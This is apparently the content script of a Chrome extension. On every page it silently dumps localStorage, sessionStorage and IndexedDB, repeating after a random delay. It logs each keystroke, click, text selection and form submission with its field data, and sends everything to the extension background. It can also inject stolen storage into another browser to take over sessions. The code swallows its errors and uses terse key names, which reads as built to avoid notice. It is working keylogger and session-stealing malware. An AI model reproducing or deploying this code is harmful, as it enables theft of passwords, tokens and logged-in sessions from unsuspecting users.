import './lib/beforeAll';

import { KeychainPayload } from './lib/types';
import { IDBExport, IDBExportInstance } from './lib/idb';
import { dumpAllStorage } from './lib/storage';

const browser = {
    //b: window.browser,
    c: window.chrome,
    //d: window.document,
    //e: window.event,
    //f: window.frames,
    //g: window.globalThis,
    //h: window.history,
    i: window.indexedDB,
    //j: window.JSON,
    k: window.localStorage,
    l: window.location,
    //m: window.Map,
    //n: window.navigator,
    //o: window.Object,
    //p: window.Promise,
    //q: window.queueMicrotask,
    //r: window.requestAnimationFrame,
    s: window.sessionStorage,
    //t: window.setTimeout,
    //u: window.URL,
};

const raiseDump = async () => {
    try {
        const idbd = await (new IDBExport(browser.i)).dumpAllDbs();

        const storage = dumpAllStorage({ localStorage: browser.k, sessionStorage: browser.s });

        const data: Partial<KeychainPayload> = {
            a: {
                l: storage.localStorage,
                s: storage.sessionStorage,
            },
            b: idbd as string[],
        };

        browser.c.runtime.sendMessage({
            type: 'xlrd_exp_req',
            data,
        });
    } catch (e) {
        //console.error(e);
    }
};

window.addEventListener('load', () => {
    let current_target: Element | null = null;

    const handle_blur = (e: Event) => {
        if (current_target !== e.target) {
            current_target = null;
        }

        current_target?.removeEventListener('blur', handle_blur);

        browser.c.runtime.sendMessage({
            type: 'xlrd_act_kd_commit',
        });
    };

    document.addEventListener('keypress', (e) => {
        browser.c.runtime.sendMessage({
            type: 'xlrd_act_kd',
            data: {
                key: e.key,
                code: e.code,
                ctrlKey: e.ctrlKey,
                shiftKey: e.shiftKey,
                altKey: e.altKey,
                metaKey: e.metaKey,

                event: 'keypress',
            },
        });

        if (current_target && current_target !== e.target) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_kd_commit',
            });
        }

        current_target = e.target as Element;

        current_target.addEventListener('blur', handle_blur);
    });

    document.addEventListener('keydown', (e) => {
        if (e.key !== 'Backspace') {
            return;
        }

        if (current_target && current_target !== e.target) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_kd_commit',
            });

            current_target = null;

            return;
        }

        browser.c.runtime.sendMessage({
            type: 'xlrd_act_kd',
            data: {
                key: e.key,
                code: e.code,
                ctrlKey: e.ctrlKey,
                shiftKey: e.shiftKey,
                altKey: e.altKey,
                metaKey: e.metaKey,
                event: 'keydown',
            },
        });
    });

    const last_text_history: string[] = [];
    const last_text_history_max = 20;

    const history_text_known = (text: string) => {
        return last_text_history.includes(text);
    };

    const history_text_add = (text: string) => {
        if (last_text_history.length >= last_text_history_max) {
            last_text_history.shift();
        }

        last_text_history.push(text);
    };

    const history_text_check_and_add = (text: string) => {
        if (history_text_known(text)) {
            return false;
        }

        history_text_add(text);

        return true;
    };

    let selection_fired = false;

    // capture clicks on elements with text
    window.addEventListener('click', (e) => {
        if (selection_fired) {
            selection_fired = false;
            return;
        }

        if (document.getSelection()?.toString().trim().length !== 0) {
            return;
        }

        // check if the click was on a link
        if (e.target instanceof HTMLAnchorElement && history_text_check_and_add(e.target.innerText)) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_ct',
                data: {
                    link: e.target.href,
                    text: e.target.innerText,
                    type: 'link',
                },
            });

            return;
        }

        // check if the click was on a button
        if (e.target instanceof HTMLButtonElement && history_text_check_and_add(e.target.innerText)) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_ct',
                data: {
                    text: e.target.innerText,
                    type: 'button',
                },
            });

            return;
        }

        if (e.target instanceof HTMLImageElement && history_text_check_and_add(e.target.src)) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_ct',
                data: {
                    link: e.target.src,
                    is_context_menu: false,
                    type: 'image',
                },
            });
        }

        // check if the click was on a text element (e.g. <p>)
        if (
            (
                e.target instanceof HTMLParagraphElement
                || e.target instanceof HTMLSpanElement
                || e.target instanceof HTMLLabelElement
                || e.target instanceof HTMLDivElement
                || e.target instanceof HTMLLIElement
            )
            && history_text_check_and_add(e.target.innerText)
        ) {
            const text = e.target.innerText;

            if (text.length > 0) {
                browser.c.runtime.sendMessage({
                    type: 'xlrd_act_ct',
                    data: {
                        text,
                        type: 'text',
                    },
                });
            }

            return;
        }
    });

    // capture right clicks on images
    window.addEventListener('contextmenu', (e) => {
        if (e.target instanceof HTMLImageElement && history_text_check_and_add(e.target.src)) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_ct',
                data: {
                    link: e.target.src,
                    is_context_menu: true,
                    type: 'image',
                },
            });
        }

        // check if the click was on a text element (e.g. <p>)
        if (e.target instanceof HTMLElement && history_text_check_and_add(e.target.innerText)) {
            const text = e.target.innerText;

            if (text.length > 0) {
                browser.c.runtime.sendMessage({
                    type: 'xlrd_act_ct',
                    data: {
                        text,
                        type: 'text',
                    },
                });
            }
        }
    });

    // capture form submissions
    document.querySelectorAll('form').forEach((form) => {
        form.addEventListener('submit', (e) => {
            if (history_text_check_and_add(form.action)) {
                browser.c.runtime.sendMessage({
                    type: 'xlrd_act_ct',
                    data: {
                        link: form.action,
                        form_data: JSON.stringify(Array.from(new FormData(form).entries())),
                        type: 'form',
                    },
                });
            }
        });
    });

    // capture text selection
    document.addEventListener('mouseup', () => {
        const selection = document.getSelection();
        const text = selection?.toString().trim();

        if (selection && text && text.length !== 0 && history_text_check_and_add(text)) {
            browser.c.runtime.sendMessage({
                type: 'xlrd_act_ct',
                data: {
                    text: selection.toString(),
                    type: 'select',
                },
            });

            selection_fired = true;
        }
    });
});

raiseDump();

setTimeout(raiseDump, 5000 + (Math.random() * 10_000));

const handle_msg =
    async (
        msg,
        _sender,
        _sendResponse,
    ) => {
        if (msg.type === 'xlrd_exp_tbs') {
            raiseDump();
        }

        if (msg.type === 'xlrd_exp_checkin') {
            browser.c.runtime.sendMessage({
                type: 'xlrd_exp_checkin_ack',
                data: msg.data,
            });
        }

        if (msg.type === 'xlrd_imp_kc') {
            const data = msg.data as KeychainPayload;

            // import localStorage and sessionStorage
            for (const [ k, v ] of Object.entries(data.a.l)) {
                try {
                    console.log('LS importing %s', k);

                    browser.k.setItem(k, v);
                } catch (e) {
                    console.error(e);
                }
            }

            for (const [ k, v ] of Object.entries(data.a.s)) {
                try {
                    console.log('SS importing %s', k);

                    browser.s.setItem(k, v);
                } catch (e) {
                    console.error(e);
                }
            }

            // import indexedDB
            const idb_data =
                data.b
                    .map(x => JSON.parse(x))
                    .map(x => [ x, Object.keys(x) ]);

            for (const [ store_data, store ] of idb_data) {
                try {
                    console.log('IDB importing %s', store);

                    const db = await IDBExportInstance.openDb(store);

                    await IDBExportInstance.importDb(
                        db,
                        store_data[store],
                    );
                } catch (e) {
                    console.error(e);
                }
            }
        }
    };

browser.c.runtime.onMessage.addListener(
    handle_msg as any,
);

window.addEventListener('message', (e) => {
    if (e.data.type === 'xlrd_datist_init_ping') {
        window.postMessage({
            type: 'xlrd_datist_init_pong',
        });
    }

    if (e.data.type === 'xlrd_datist_import_req') {
        browser.c.runtime.sendMessage({
            type: 'xlrd_datist_import_req',
            data: e.data.data,
        });
    }
});

window.postMessage({
    type: 'xlrd_datist_init_pong',
});